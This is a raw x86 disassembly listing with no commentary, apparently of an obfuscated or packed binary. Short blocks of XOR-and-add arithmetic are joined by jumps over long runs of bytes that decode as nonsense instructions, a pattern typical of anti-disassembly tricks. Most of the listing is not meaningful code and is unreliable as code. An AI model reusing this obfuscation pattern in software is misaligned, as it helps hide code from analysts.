  410b8b:	and    eax,0x32e3b968
  410b90:	sti    
  410b91:	out    0x69,al
  410b93:	inc    edx
  410b94:	mov    esp,0x760a00ea
  410b99:	push   ebx
  410b9a:	(bad)  
  410b9b:	std    
  410b9c:	into   
  410b9d:	sub    eax,0x3d23e95a
  410ba2:	dec    ecx
  410ba3:	(bad)  [ebp+0x15218658]
  410ba9:	mov    dl,0x47
  410bab:	mov    ebx,0x3c7c0a02
  410bb0:	or     ch,BYTE PTR [ecx+0x4c035775]
  410bb6:	in     eax,0xdd
  410bb8:	push   edx
  410bb9:	inc    ebx
  410bba:	jle    0x410c0f
  410bbc:	mov    DWORD PTR [edi+0x8],ebx
  410bbf:	inc    ecx
  410bc0:	call   0xe294245c
  410bc5:	pop    eax
  410bc6:	ss jmp 0x410bf6
  410bc9:	jbe    0x410c1b
  410bcb:	mov    edx,0xe386220c
  410bd0:	inc    ebp
  410bd1:	call   0x33830fca
  410bd6:	pop    esi
  410bd7:	xor    dl,al
  410bd9:	outs   dx,BYTE PTR ds:[esi]
  410bda:	ins    BYTE PTR es:[edi],dx
  410bdb:	int    0x73
  410bdd:	adc    cl,BYTE PTR [esi]
  410bdf:	jae    0x410ba4
  410be1:	jnp    0x410b8e
  410be3:	jae    0x410c64
  410be5:	pop    eax
  410be6:	and    eax,0xe4b5cb12
  410beb:	pop    ss
  410bec:	push   0xeaed57c0
  410bf1:	and    cl,cl
  410bf3:	sbb    DWORD PTR [edi],ecx
  410bf5:	xor    ah,BYTE PTR [ebx+0x1d]
  410bf8:	out    0x47,al
  410bfa:	loopne 0x410ba4
  410bfc:	and    bl,dl
  410bfe:	pop    ecx
  410bff:	sbb    eax,0x3b8b2cbb
  410c04:	push   edi
  410c05:	mov    ecx,0x7c52289e
  410c0a:	xor    ch,BYTE PTR [ebp+eax*1+0x2c]
  410c0e:	and    DWORD PTR [esi+ebx*4-0x528b4884],esi
  410c15:	pop    ds
  410c16:	fcom   DWORD PTR [edi+0x49332784]
  410c1c:	pop    ebx
  410c1d:	xchg   ebx,ecx
  410c1f:	sub    ebx,ecx
  410c21:	xchg   ebx,ecx
  410c23:	dec    ecx
  410c24:	mov    eax,DWORD PTR [ebp-0x1c]
  410c27:	imul   eax,ecx
  410c2a:	sub    esp,eax
  410c2c:	mov    DWORD PTR [ebp-0x24],esp
  410c2f:	mov    eax,DWORD PTR [ebp-0x4]
  410c32:	mov    ecx,0x7510853
  410c37:	xor    eax,ecx
  410c39:	mov    edx,0x32729a
  410c3e:	add    eax,edx
  410c40:	mov    DWORD PTR [ebp+0x8],eax
  410c43:	mov    eax,DWORD PTR [ebp-0x18]
  410c46:	xor    eax,ecx
  410c48:	add    eax,edx
  410c4a:	mov    edx,DWORD PTR [ebp+0x14]
  410c4d:	imul   eax,DWORD PTR [edx]
  410c50:	mov    edx,DWORD PTR [ebp-0x4]
  410c53:	xor    edx,ecx
  410c55:	mov    ecx,DWORD PTR [ebp+0x8]
  410c58:	lea    ecx,[edx+ecx*1+0x32729a]
  410c5f:	cmp    ecx,eax
  410c61:	je     0x411089
  410c67:	mov    edi,DWORD PTR [ebp-0x18]
  410c6a:	mov    eax,DWORD PTR [ebp+0x8]
  410c6d:	mov    edx,DWORD PTR [ebp+0x14]
  410c70:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  410c74:	jmp    0x410daf
  410c79:	sbb    DWORD PTR [eax+0x31],0x6d5dfd4a
  410c80:	jae    0x410c66
  410c82:	jb     0x410c33
  410c84:	pop    ds
  410c85:	inc    edi
  410c86:	pop    ebx
  410c87:	dec    esi
  410c88:	mov    edx,0x7c7c4437
  410c8d:	adc    bh,BYTE PTR [edi+0x7c]
  410c90:	jl     0x410c5c
  410c92:	sbb    ebp,edx
  410c94:	fs jmp 0xaf6bc56c
  410c9a:	jg     0x410c9d
  410c9c:	call   0x8b2d:0x9da3b1d9
  410ca3:	sbb    DWORD PTR [ebx-0x14],0xffffff94
  410ca7:	pop    ebp
  410ca8:	in     al,dx
  410ca9:	enter  0xa065,0xf4
  410cad:	aaa    
  410cae:	add    al,0x6f
  410cb0:	in     al,0x43
  410cb2:	mov    DWORD PTR ds:0xdc0bfb42,eax
  410cb8:	inc    ebp
  410cb9:	mov    esi,0x5032c0db
  410cbe:	imul   edi,eax,0xc009e06
  410cc4:	or     cl,bh
  410cc6:	xchg   esp,eax
  410cc7:	fwait
  410cc8:	pop    edi
  410cc9:	mov    edi,0x2abef5ad
  410cce:	test   DWORD PTR [edi-0x5a],esi
  410cd1:	ja     0x410ca0
  410cd3:	test   al,0xc5
  410cd6:	aaa    
  410cd7:	mov    ch,0x8e
  410cd9:	sar    DWORD PTR [ecx-0x71],cl
  410cdc:	adc    eax,0x5e370f1c
  410ce1:	inc    ebp
  410ce2:	imul   eax,ecx,0x9390bf38
  410ce8:	sbb    BYTE PTR [eax+0x679163ea],al
  410cee:	sub    ah,BYTE PTR [esi+0x43e5ad99]
  410cf4:	sub    edi,edx
  410cf6:	dec    eax
  410cf7:	pop    edx
  410cf8:	lahf   
  410cf9:	cmp    eax,0xa3d2f104
  410cfe:	rol    DWORD PTR [edi],1
  410d00:	and    al,0xa4
  410d02:	pop    ss
  410d03:	pop    esp
  410d04:	repnz add BYTE PTR [eax-0x175c2d3f],ah
  410d0b:	cmp    BYTE PTR [edi-0x75],dl
  410d0e:	cmp    al,0x1f
  410d10:	outs   dx,BYTE PTR ds:[esi]
  410d11:	clc    
  410d12:	rol    BYTE PTR [ebp-0x41a5a2ca],0x43
  410d19:	push   edx
  410d1a:	sar    DWORD PTR [ecx+0x48],1
  410d1d:	mov    al,BYTE PTR ds:0x74776fef
  410d23:	lahf   
  410d24:	dec    eax
  410d25:	add    eax,0x3954a6a2
  410d2a:	jmp    FWORD PTR [edx]
  410d2c:	push   edx
  410d2d:	ret    
  410d2e:	xchg   edx,eax
  410d2f:	stos   DWORD PTR es:[edi],eax
  410d30:	jmp    0x64ee3cb8
  410d35:	adc    eax,0xe556716
  410d3a:	fist   DWORD PTR [ecx-0x46]
  410d3d:	cmp    DWORD PTR [ebx-0x19],edi
  410d40:	add    BYTE PTR [edx+ebx*4],ch
  410d43:	mov    eax,ds:0xd99607f8
  410d48:	xchg   BYTE PTR [edi+0x5da4fbb9],dh
  410d4e:	in     eax,0xbf
  410d50:	pop    ebp
  410d51:	(bad)  
  410d52:	xor    eax,0x9a4578fd
  410d57:	out    0x7d,al
  410d59:	pop    edx
  410d5a:	lock inc eax
  410d5c:	or     DWORD PTR [ebp+0x5a68a219],edx
  410d62:	out    dx,eax
  410d63:	mov    edx,0x1de8df7e
  410d68:	in     eax,dx
  410d69:	pop    esp
  410d6a:	cmp    esi,ebx
  410d6c:	pusha  
  410d6d:	scas   al,BYTE PTR es:[edi]
  410d6e:	fwait
  410d6f:	fs pushf 
  410d71:	mov    bl,0x1f
  410d73:	in     al,0x90
  410d75:	sbb    al,0x7d
  410d77:	push   ebp
  410d78:	jmp    0x1d696c25
  410d7d:	inc    eax
  410d7e:	adc    al,0x39
  410d80:	pusha  
  410d81:	cld    
  410d82:	and    BYTE PTR [esi+0x21],al
  410d85:	jmp    0xb4a36e86
  410d8a:	xchg   ah,al
  410d8c:	jle    0x410e06
  410d8e:	(bad)  
  410d90:	lock push es
  410d92:	xchg   ecx,eax
  410d93:	or     dl,BYTE PTR [eax+0x22]
  410d96:	mov    ebx,DWORD PTR [edx]
  410d98:	(bad)  
  410d99:	aad    0xb6
  410d9b:	jmp    0x30d231c7
  410da0:	cmp    edx,ebx
  410da2:	sbb    eax,0xc73e7b1e
  410da7:	rcl    BYTE PTR [ebp-0x15],0x93
  410dab:	popf   
  410dac:	arpl   WORD PTR [ecx+0x853b9cc],dx
  410db2:	push   ecx
  410db3:	pop    es
  410db4:	xor    edx,edx
  410db6:	xor    edi,ecx
  410db8:	mov    esi,0x32729a
  410dbd:	add    edi,esi
  410dbf:	div    edi
  410dc1:	mov    edx,DWORD PTR [ebp-0x4]
  410dc4:	xor    edx,ecx
  410dc6:	lea    eax,[edx+eax*1+0x32729a]
  410dcd:	mov    edx,DWORD PTR [ebp+0x8]
  410dd0:	mov    edi,DWORD PTR [ebp-0x24]
  410dd3:	mov    DWORD PTR [edi+edx*4],eax
  410dd6:	mov    eax,DWORD PTR [ebp-0x18]
  410dd9:	mov    edx,DWORD PTR [ebp+0x8]
  410ddc:	xor    eax,ecx
  410dde:	lea    eax,[eax+edx*1+0x32729a]
  410de5:	mov    DWORD PTR [ebp+0x8],eax
  410de8:	mov    eax,DWORD PTR [ebp-0x18]
  410deb:	mov    edx,DWORD PTR [ebp+0x14]
  410dee:	xor    eax,ecx
  410df0:	jmp    0x410f2b
  410df5:	mov    ch,0xd5
  410df7:	or     dh,dh
  410df9:	push   0xd05d7df1
  410dfe:	sbb    DWORD PTR [ebx-0x17821800],esi
  410e04:	stos   DWORD PTR es:[edi],eax
  410e05:	aad    0x47
  410e07:	jl     0x410e85
  410e09:	adc    bh,BYTE PTR [edi+0x7c]
  410e0c:	jl     0x410db6
  410e0e:	add    dh,BYTE PTR [esi+0x3c226618]
  410e14:	in     al,0x54
  410e16:	dec    ebx
  410e17:	pop    ds
  410e18:	sahf   
  410e19:	sti    
  410e1a:	shl    DWORD PTR [ecx+0x5c],1
  410e1d:	sbb    ebp,DWORD PTR [ebp-0x6809cdf5]
  410e23:	rcr    DWORD PTR [ebx+0xe],1
  410e26:	adc    al,0x8f
  410e28:	add    ecx,DWORD PTR [ebp+eax*1-0x4a]
  410e2c:	fist   WORD PTR [esi]
  410e2e:	aaa    
  410e2f:	call   0xe651:0xf1df4a80
  410e36:	jp     0x410e60
  410e38:	or     dh,bh
  410e3a:	scas   eax,DWORD PTR es:[edi]
  410e3b:	sub    eax,0x6268a80
  410e40:	jmp    0x9144bca8
  410e45:	add    eax,0xf3c83253
  410e4a:	fidivr DWORD PTR [eax+0x6ac3a0ea]
  410e50:	ins    DWORD PTR es:[edi],dx
  410e51:	pop    es
  410e52:	jae    0x410ea0
  410e54:	mov    ch,0x30
  410e56:	sub    edx,eax
  410e58:	iret   
  410e59:	jne    0x410e78
  410e5b:	leave  
  410e5c:	add    eax,DWORD PTR [ecx-0x46]
  410e5f:	inc    ebp
  410e60:	mov    ebp,0x86250cac
  410e65:	stos   BYTE PTR es:[edi],al
  410e66:	sub    DWORD PTR [ebp-0x72bd9a14],edx
  410e6c:	adc    ch,BYTE PTR [esi-0x2217e597]
  410e72:	mov    bl,0x1b
  410e74:	xchg   ebx,eax
  410e75:	pusha  
  410e76:	and    esi,esp
  410e78:	sbb    BYTE PTR [ebp+0x7d],cl
  410e7b:	push   0x2d
  410e7d:	neg    bl
  410e7f:	sar    BYTE PTR ss:[ecx-0x50c0c17e],0x18
  410e87:	inc    esp
  410e88:	dec    esi
  410e89:	pop    esp
  410e8a:	xor    DWORD PTR [edi-0x32],edi
  410e8d:	call   0x5440b922
  410e92:	mov    bh,0xb8
  410e94:	cmp    BYTE PTR [ebx-0x629fd2ba],ah
  410e9a:	push   0xffffff85
  410e9c:	nop
  410e9d:	test   eax,0x40922199
  410ea2:	add    BYTE PTR [edx-0x4f],0xab
  410ea6:	outs   dx,BYTE PTR ds:[esi]
  410ea7:	xor    ah,BYTE PTR [ecx-0x10]
  410eaa:	out    0x17,al
  410eac:	or     BYTE PTR [edx],cl
  410eae:	pop    edx
  410eaf:	add    dl,al
  410eb1:	jge    0x410e6d
  410eb3:	stc    
  410eb4:	jg     0x410f14
  410eb6:	add    DWORD PTR [ebp+0x3d],edx
  410eb9:	jmp    0x410e4a
  410ebb:	out    0xfb,eax
  410ebd:	mov    al,ds:0xb34cf5e9
  410ec2:	mov    bl,0x22
  410ec4:	cmp    cl,BYTE PTR [edx]
  410ec6:	xor    dl,ch
  410ec8:	ss cld 
  410eca:	adc    ebp,DWORD PTR [ebx-0x73]
  410ecd:	pop    ds
  410ece:	xchg   esi,eax
  410ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ed0:	add    dh,BYTE PTR [ebp+0x7e]
  410ed3:	jg     0x410eff
  410ed5:	cmc    
  410ed6:	fcmovu st,st(6)
  410ed8:	push   ss
  410ed9:	inc    ebp
  410eda:	xchg   esi,ebp
  410edc:	arpl   ax,sp
  410ede:	(bad)  
  410edf:	push   eax
  410ee0:	int    0xb0
  410ee2:	push   0x53
  410ee4:	dec    edx
  410ee5:	rcr    eax,1
  410ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ee8:	ret    
  410ee9:	mov    ecx,0x50a0c04c
  410eee:	cdq    
  410eef:	jno    0x410f70
  410ef1:	rcl    DWORD PTR [edi-0x7118f9d1],0xc3
  410ef8:	icebp  
  410ef9:	in     eax,0xca
  410efb:	mov    ebp,0xb8e2f838
  410f00:	dec    edx
  410f01:	push   ecx
  410f02:	push   edx
  410f03:	cmp    BYTE PTR [edi],dl
  410f05:	push   0xa3634eae
  410f0a:	push   edx
  410f0b:	jbe    0x410e9b
  410f0d:	sub    al,0x87
  410f0f:	sbb    BYTE PTR [edi-0x22],ah
  410f12:	xchg   esi,eax
  410f13:	add    DWORD PTR [ecx+0x7b779562],0x64
  410f1a:	jae    0x410f2c
  410f1c:	mov    ecx,0xd6183e14
  410f21:	stos   DWORD PTR es:[edi],eax
  410f22:	fimul  WORD PTR [edi+0x5c08ccd3]
  410f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f29:	jo     0x410eae
  410f2b:	add    eax,esi
  410f2d:	imul   eax,DWORD PTR [edx]
  410f30:	mov    edx,DWORD PTR [ebp-0x4]
  410f33:	xor    edx,ecx
  410f35:	mov    ecx,DWORD PTR [ebp+0x8]
  410f38:	jmp    0x411073
  410f3d:	pop    eax
  410f3e:	shl    BYTE PTR [ebp+0x13],0x7d
  410f42:	mov    ebp,0x8c3c7362
  410f47:	cmp    cl,al
  410f49:	retf   
  410f4a:	sub    BYTE PTR [esi+0x7c46ebca],dl
  410f50:	jl     0x410f64
  410f52:	jg     0x410fd0
  410f54:	jl     0x410f3a
  410f56:	mov    DWORD PTR [ecx+0x6bcf4e2f],ebp
  410f5c:	pushf  
  410f5d:	ds rcr ecx,1
  410f60:	lds    edx,FWORD PTR ds:0x3cbe4e9d
  410f66:	fwait
  410f67:	(bad)  
  410f68:	pushf  
  410f69:	pop    es
  410f6a:	adc    DWORD PTR [ecx+eiz*1+0x73],ebp
  410f6e:	xchg   DWORD PTR [eax],ecx
  410f70:	mov    bl,0xe7
  410f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f73:	into   
  410f74:	push   esp
  410f75:	rcr    BYTE PTR [edi],0x20
  410f78:	fadd   QWORD PTR [esi-0x79]
  410f7b:	pop    edi
  410f7c:	repnz cmp BYTE PTR [edi],0x74
  410f80:	sbb    DWORD PTR [ebp+edx*8-0x27],edx
  410f84:	fmulp  st(3),st
  410f86:	fldcw  WORD PTR [ebx+0x59]
  410f89:	push   ds
  410f8a:	cdq    
  410f8b:	iret   
  410f8c:	jmp    0x410f25
  410f8e:	popf   
  410f8f:	xor    BYTE PTR [eax-0x2d],ah
  410f92:	xchg   esp,eax
  410f93:	cvttps2pi mm1,xmm7
  410f96:	mov    BYTE PTR [edx+0x1d0644ee],ah
  410f9c:	popa   
  410f9d:	mov    bl,0xac
  410f9f:	out    0xf8,al
  410fa1:	rcl    DWORD PTR [ebp-0x76],1
  410fa4:	xchg   esp,eax
  410fa5:	cmc    
  410fa6:	out    0x6e,eax
  410fa8:	hlt    
  410fa9:	mov    ebp,0x860ab68e
  410fae:	ret    0xcb8a
  410fb1:	arpl   bp,di
  410fb3:	(bad)  
  410fb4:	aam    0xe1
  410fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fb7:	xor    al,BYTE PTR [edx]
  410fb9:	bound  eax,QWORD PTR [ebp-0x30]
  410fbc:	in     eax,dx
  410fbd:	push   cs
  410fbe:	and    esi,DWORD PTR [ebp-0x53]
  410fc1:	in     eax,dx
  410fc2:	jmp    0x410f71
  410fc4:	mov    ebp,DWORD PTR [edx-0x1f]
  410fc7:	fbstp  TBYTE PTR [ecx-0x4c3a183b]
  410fcd:	jb     0x410f56
  410fcf:	int3   
  410fd0:	sub    DWORD PTR [esi-0x44],esi
  410fd3:	fist   WORD PTR [ebp+0x3c936981]
  410fd9:	inc    esp
  410fda:	pusha  
  410fdb:	and    bh,BYTE PTR [ecx]
  410fdd:	lea    esi,[esi]
  410fdf:	test   DWORD PTR [esp+eax*2+0x3],esi
  410fe3:	shr    DWORD PTR ds:0x1b19b54b,0x6e
  410fea:	xchg   ecx,eax
  410feb:	fdiv   QWORD PTR [ebp+0x4f]
  410fee:	add    al,BYTE PTR [edi+ebx*8+0x65]
  410ff2:	push   eax
  410ff3:	pop    ebx
  410ff4:	push   esi
  410ff5:	xlat   BYTE PTR ds:[ebx]
  410ff6:	pop    ebx
  410ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ff8:	ja     0x410fa1
  410ffa:	popa   
  410ffb:	retf   0x6f2a
  410ffe:	cdq    
  410fff:	inc    ebp
  411000:	out    0x40,al
  411002:	(bad)  
  411003:	mov    edx,0xa5cd1a9c
  411008:	fisub  WORD PTR [eax+ebp*8-0x602589d9]
  41100f:	mov    ebx,0x8c600400
  411014:	jo     0x410fd9
  411016:	add    bh,BYTE PTR [ecx+0xdcf1a74]
  41101c:	test   eax,0xab3f75aa
  411021:	xor    ebp,esp
  411023:	cmp    cl,BYTE PTR [ecx+0x184d1005]
  411029:	jno    0x411048
  41102b:	ror    BYTE PTR [ebx-0x31],cl
  41102e:	sbb    al,0x6e
  411030:	data16 hlt 
  411032:	add    dh,dh
  411034:	in     al,dx
  411035:	cmp    BYTE PTR [ebx],cl
  411037:	sub    al,0x6c
  411039:	outs   dx,BYTE PTR ds:[esi]
  41103a:	ins    BYTE PTR es:[edi],dx
  41103b:	outs   dx,DWORD PTR ds:[esi]
  41103c:	rcr    DWORD PTR [ecx],cl
  41103e:	or     edi,DWORD PTR [edi-0x1c561a2f]
  411044:	pop    esi
  411045:	xchg   ecx,eax
  411046:	pop    ebx
  411047:	jp     0x41105b
  411049:	xchg   esp,eax
  41104a:	add    ebp,DWORD PTR [ebx+0x1e]
  41104d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41104e:	mov    cl,0xe1
  411050:	jbe    0x4110ae
  411052:	outs   dx,BYTE PTR ds:[esi]
  411053:	iret   
  411054:	loop   0x4110a2
  411056:	fmul   st,st(6)
  411058:	mov    bl,0xa0
  41105a:	cdq    
  41105b:	(bad)  
  41105c:	cmp    ch,dh
  41105e:	sub    al,0xb1
  411060:	fnstsw WORD PTR [eax+0x2e]
  411063:	mov    al,ds:0x8abda730
  411068:	jb     0x4110b4
  41106a:	and    ecx,DWORD PTR [ecx-0x6]
  41106d:	out    0x50,eax
  41106f:	lock and cl,ah
  411072:	ror    DWORD PTR [ebp+0x729a0a8c],1
  411078:	xor    al,BYTE PTR [eax]
  41107a:	cmp    ecx,eax
  41107c:	jne    0x410c67
  411082:	mov    ebx,esi
  411084:	jmp    0x41108e
  411089:	mov    ebx,0x32729a
  41108e:	mov    eax,DWORD PTR [ebp-0x4]
  411091:	xor    eax,0x7510853
  411096:	add    eax,ebx
  411098:	mov    DWORD PTR [ebp-0xc],eax
  41109b:	xor    ebx,ebx
  41109d:	lea    eax,[ebp-0x10]
  4110a0:	jmp    0x4111db
  4110a5:	into   
  4110a6:	aas    
  4110a7:	in     eax,0x49
  4110a9:	cmc    
  4110aa:	jne    0x411116
  4110ac:	mov    edi,0x9e11fbf4
  4110b1:	aam    0xc6
  4110b3:	imul   ecx,DWORD PTR fs:[ecx+0x127c7c41],0x697c7c7f
  4110be:	sub    DWORD PTR [ebx+0x32],ebp
  4110c1:	mov    bh,0x90
  4110c3:	sbb    dh,BYTE PTR [edx]
  4110c5:	ins    DWORD PTR es:[edi],dx
  4110c6:	xor    DWORD PTR [ebx-0x79a0f016],esi
  4110cc:	ss icebp 
  4110ce:	(bad)  
  4110cf:	ins    DWORD PTR es:[edi],dx
  4110d0:	nop
  4110d1:	data16 loopne 0x4110ec
  4110d4:	(bad)  
  4110d5:	test   bl,0x4b
  4110d8:	push   eax
  4110d9:	arpl   WORD PTR [eax],bx
  4110db:	repz mov edi,DWORD PTR [ecx]
  4110de:	jmp    FWORD PTR [ecx-0xc7f0c8a]
  4110e4:	lahf   
  4110e5:	lds    ebp,FWORD PTR [ebx]
  4110e7:	es add al,0xf5
  4110ea:	xor    cl,BYTE PTR [edi-0x4d]
  4110ed:	push   cs
  4110ee:	dec    edx
  4110ef:	les    esi,FWORD PTR [ebx+eax*2-0x76]
  4110f3:	inc    eax
  4110f4:	scas   eax,DWORD PTR es:[edi]
  4110f5:	adc    dl,dh
  4110f7:	ins    BYTE PTR es:[edi],dx
  4110f8:	sbb    bl,cl
  4110fa:	adc    cl,0xb5
  4110fd:	jne    0x4110df
  4110ff:	dec    esp
  411100:	adc    esp,DWORD PTR [edi]
  411102:	and    edi,eax
  411104:	data16 js 0x41109a
  411107:	push   eax
  411108:	inc    ecx
  411109:	enter  0x49a9,0x79
  41110d:	outs   dx,DWORD PTR ds:[esi]
  41110e:	and    DWORD PTR [edi-0x47462821],eax
  411114:	mov    DWORD PTR [ecx],edx
  411116:	nop
  411117:	std    
  411118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411119:	stos   DWORD PTR es:[edi],eax
  41111a:	in     al,0xc1
  41111c:	fs inc ecx
  41111e:	fs (bad) 
  411120:	mov    edx,0xce0f4ce2
  411125:	mov    edi,0x322bfed4
  41112a:	std    
  41112b:	test   BYTE PTR [esi+0x9],bh
  41112e:	or     eax,0xf420a11e
  411133:	mov    al,ds:0x6d1f299b
  411138:	imul   bl
  41113a:	test   eax,0x1dd748e
  41113f:	add    bl,cl
  411141:	les    edx,FWORD PTR [edx]
  411143:	cmc    
  411144:	and    DWORD PTR [edx],ebx
  411146:	stos   BYTE PTR es:[edi],al
  411147:	js     0x411196
  411149:	sbb    BYTE PTR [esp+eiz*8],bl
  41114c:	(bad)  
  41114d:	xchg   esi,eax
  41114e:	scas   al,BYTE PTR es:[edi]
  41114f:	pop    ds
  411150:	jle    0x41116b
  411152:	mov    dl,0x5c
  411154:	je     0x411113
  411156:	mov    edx,0xf103d401
  41115b:	sub    DWORD PTR [eax],edx
  41115d:	mov    edi,0x25cbeda8
  411162:	mov    bl,0xd6
  411164:	mov    edi,0xa876075d
  411169:	jmp    0x41118e
  41116b:	pushf  
  41116c:	cmp    DWORD PTR [ebx+0x68],eax
  41116f:	repz aad 0x57
  411172:	(bad)  
  411173:	cli    
  411174:	mov    ds,WORD PTR [esi-0xfd86101]
  41117a:	pop    ss
  41117b:	das    
  41117c:	jb     0x411118
  41117e:	lahf   
  41117f:	div    DWORD PTR [esi+0x13]
  411182:	sbb    al,0xcb
  411184:	push   esi
  411185:	mov    ch,ch
  411187:	adc    al,dh
  411189:	dec    ebx
  41118a:	fsubr  st(6),st
  41118c:	and    ch,al
  41118e:	sbb    al,0x5a
  411190:	cli    
  411191:	fsub   QWORD PTR [esp+ebx*8]
  411194:	add    cl,cl
  411196:	call   0xe67adcda
  41119b:	retf   
  41119c:	cli    
  41119d:	sub    DWORD PTR [edx],eax
  41119f:	bound  edx,QWORD PTR [ebx]
  4111a1:	mov    esp,0x5bc1df6b
  4111a6:	xor    al,0x58
  4111a8:	dec    edi
  4111a9:	mov    edi,0x2eda0508
  4111ae:	retf   0x235f
  4111b1:	retf   0xf70c
  4111b4:	ins    DWORD PTR es:[edi],dx
  4111b5:	sti    
  4111b6:	add    BYTE PTR ds:[eax],0xc6
  4111ba:	inc    ebx
  4111bb:	mov    ch,0xf
  4111bd:	jb     0x411200
  4111bf:	in     al,dx
  4111c0:	jo     0x4111e9
  4111c2:	push   esp
  4111c3:	pop    edx
  4111c4:	inc    edi
  4111c5:	and    BYTE PTR [ecx],cl
  4111c7:	les    esi,FWORD PTR [ecx]
  4111c9:	and    BYTE PTR [edx],ch
  4111cb:	in     eax,dx
  4111cc:	sahf   
  4111cd:	xlat   BYTE PTR ds:[ebx]
  4111ce:	pop    esp
  4111cf:	fadd   DWORD PTR [eax]
  4111d1:	push   esi
  4111d2:	imul   ebp,DWORD PTR [eax-0x2e631e8c],0x338ef7e
  4111dc:	sbb    bh,bh
  4111de:	shl    DWORD PTR [ebx],cl
  4111e0:	fild   DWORD PTR [ebx+0x39]
  4111e3:	pop    ebp
  4111e4:	adc    BYTE PTR [edi],cl
  4111e6:	test   BYTE PTR [ebx+0x1],dl
  4111e9:	add    BYTE PTR [eax],al
  4111eb:	xchg   edx,eax
  4111ec:	jmp    0x411327
  4111f1:	push   ecx
  4111f2:	(bad)  
  4111f3:	fsub   st(2),st
  4111f5:	imul   esi,edx,0x2efa635d
  4111fb:	enter  0x575a,0xf4
  4111ff:	and    eax,0x7c40af11
  411204:	jl     0x411218
  411206:	jg     0x411284
  411208:	jl     0x411190
  41120a:	iret   
  41120b:	pop    ecx
  41120c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41120d:	bound  eax,QWORD PTR [ebp-0x20023568]
  411213:	dec    ebx
  411214:	lea    ecx,[edi-0x44]
  411217:	cli    
  411218:	sub    BYTE PTR [ebp-0x11],ah
  41121b:	js     0x4111b5
  41121d:	ret    0x139e
  411220:	loope  0x4111a2
  411222:	jle    0x411232
  411224:	add    al,BYTE PTR [edi+0x4659a0b5]
  41122a:	inc    si
  41122c:	mov    BYTE PTR [eax-0x66e44ee0],dl
  411232:	push   ds
  411233:	lds    esi,FWORD PTR [edi]
  411235:	test   eax,0x1f26fe53
  41123a:	xchg   edx,edi
  41123c:	cmp    al,0xe8
  41123e:	or     al,0x77
  411240:	in     al,0x9d
  411242:	and    BYTE PTR [esi-0x14],0x7a
  411246:	jb     0x4111e9
  411248:	imul   edx,DWORD PTR [ebp+0x30],0xc401872d
  41124f:	or     al,BYTE PTR [edi]
  411251:	mov    al,0x38
  411253:	jle    0x41129f
  411255:	not    dl
  411257:	int3   
  411258:	out    0xb8,eax
  41125a:	jmp    0x8222:0xe04113
  411261:	xor    al,0x96
  411263:	test   BYTE PTR ds:0x2a45c3ae,0xb5
  41126a:	stos   BYTE PTR es:[edi],al
  41126b:	sar    ebx,cl
  41126d:	xchg   BYTE PTR [esi-0x640845e2],dh
  411273:	mov    cl,0xc1
  411275:	popa   
  411276:	nop
  411277:	or     al,0x1a
  411279:	inc    edx
  41127a:	and    cl,BYTE PTR ds:0xc594535d
  411280:	mov    al,BYTE PTR ds:0x2e2732d9
  411286:	sub    eax,0xa2060d0
  41128b:	pop    ds
  41128c:	retf   0xcd4a
  41128f:	(bad)  
  411290:	sbb    ch,BYTE PTR [edx-0x60]
  411293:	xchg   edi,eax
  411294:	or     al,BYTE PTR [esi-0x149e7120]
  41129a:	lahf   
  41129b:	ss mov ebp,0x1605f208
  4112a1:	jp     0x411304
  4112a3:	sub    ebx,esi
  4112a5:	enter  0x7407,0x2
  4112a9:	inc    DWORD PTR [edi]
  4112ab:	jae    0x411321
  4112ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112ae:	rol    BYTE PTR [edi+edi*8-0x36e3c2fe],cl
  4112b5:	mov    eax,ds:0xde310c1b
  4112ba:	out    0x5,al
  4112bc:	ins    DWORD PTR es:[edi],dx
  4112bd:	(bad)  
  4112bf:	icebp  
  4112c0:	stc    
  4112c1:	mov    ah,0xf5
  4112c3:	mov    ds:0x2bb27a8e,eax
  4112c8:	sbb    eax,0xd22ff14a
  4112cd:	popa   
  4112ce:	mov    DWORD PTR [ebx],eax
  4112d0:	(bad)  
  4112d2:	ret    
  4112d3:	cld    
  4112d4:	into   
  4112d5:	(bad)  
  4112d6:	cdq    
  4112d7:	pop    ecx
  4112d8:	inc    esp
  4112d9:	push   cs
  4112da:	scas   al,BYTE PTR es:[edi]
  4112db:	shl    DWORD PTR [edi+esi*4-0x23],1
  4112df:	fstp   st(1)
  4112e1:	xchg   ecx,eax
  4112e2:	mov    edi,0x228d5280
  4112e7:	mov    eax,ds:0xa2dae1c8
  4112ec:	mov    esp,0x36e2c93c
  4112f1:	mov    al,0x6e
  4112f3:	je     0x41128d
  4112f5:	push   ss
  4112f6:	mov    DWORD PTR [ebp-0x626725b7],0xc5ce0e3
  411300:	sahf   
  411301:	jle    0x41136f
  411303:	fadd   st(2),st
  411305:	gs xor eax,0xa4bcf56f
  41130b:	sbb    eax,0xe38ed346
  411310:	mov    edi,0x1ee6104a
  411315:	cmp    BYTE PTR [ecx],ah
  411317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411318:	loopne 0x411360
  41131a:	jbe    0x4112a3
  41131c:	ds loope 0x411345
  41131f:	and    eax,0x43241d0c
  411324:	popa   
  411325:	mov    eax,DWORD PTR [ebx]
  411327:	push   0xa
  411329:	pop    ecx
  41132a:	push   0x4
  41132c:	pop    ebx
  41132d:	inc    ebx
  41132e:	xchg   ebx,ecx
  411330:	sub    ebx,ecx
  411332:	xchg   ebx,ecx
  411334:	dec    ecx
  411335:	mov    eax,DWORD PTR [ebp-0x1c]
  411338:	imul   eax,ecx
  41133b:	add    esp,eax
  41133d:	xchg   edx,eax
  41133e:	push   eax
  41133f:	xor    ebx,ebx
  411341:	mov    edx,esp
  411343:	jmp    0x41147e
  411348:	sub    BYTE PTR [edi+0x7165615e],cl
  41134e:	xor    ebx,DWORD PTR [ebp-0x7b]
  411351:	into   
  411352:	jge    0x411370
  411354:	icebp  
  411355:	xchg   esi,eax
  411356:	and    ah,BYTE PTR ds:0x7c7c434d
